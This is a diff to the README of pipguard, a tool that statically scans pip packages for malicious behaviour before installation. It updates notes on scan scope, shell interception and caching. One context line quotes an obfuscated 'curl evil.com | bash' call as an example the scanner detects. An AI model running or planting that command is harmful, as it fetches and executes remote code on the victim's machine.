@@ -25,14 +25,13 @@ Every `pip install` triggers a two-layer analysis before anything downloads:
 
 **Layer 1 — Trust signals** (no download required)
 - Package age and version history
-- Maintainer account signals
 - Download spike detection
 - Known CVEs via OSV.dev
 - GitHub repo presence
 
 **Layer 2 — Static code analysis** (AST-based)
 - Downloads the source tarball
-- Analyzes `setup.py`, `pyproject.toml`, `__init__.py` without executing anything
+- Analyzes `setup.py` and `__init__.py` via AST and scans `pyproject.toml` values without executing anything
 - Detects network calls, env variable access, shell execution, base64 obfuscation, home directory access
 
 Results are combined into a risk score:
@@ -83,6 +82,8 @@ pipguard configure
 
 `configure` writes a shell function to your profile that intercepts `pip install`. Works on bash, zsh, fish, and PowerShell. Close and reopen your terminal after running it.
 
+Simple single-package installs are routed through pipguard automatically. More complex `pip install` commands such as `-r`, `--upgrade`, local paths, or multi-package installs pass through to pip unchanged.
+
 To update pipguard itself, bypass the shell function:
 
 ```bash
@@ -99,7 +100,7 @@ pipguard info <package>                # report only, no install
 pipguard scan                          # scan requirements.txt
 pipguard scan --ci --fail-on medium    # CI mode, exits 1 on threshold
 pipguard history                       # recent scan results
-pipguard update --force                # clear CVE cache immediately
+pipguard update --force                # clear cached analysis results immediately
 pipguard configure                     # set up shell interception
 ```
 
@@ -130,7 +131,7 @@ getattr(os, 'sys'+'tem')('curl evil.com | bash')
 
 ## Caching
 
-Results are cached locally at `~/.pipguard/cache.db` — trust scores for 24 hours, CVE data for 6 hours. Repeat installs of the same package are instant. Use `--no-cache` to force a fresh check, or `pipguard update --force` to immediately refresh vulnerability data after a major security event.
+Results are cached locally at `~/.pipguard/cache.db` for 24 hours. Repeat installs of the same package are instant. Use `--no-cache` to force a fresh check, or `pipguard update --force` to immediately clear cached analyses after a major security event.
 
 ---
 
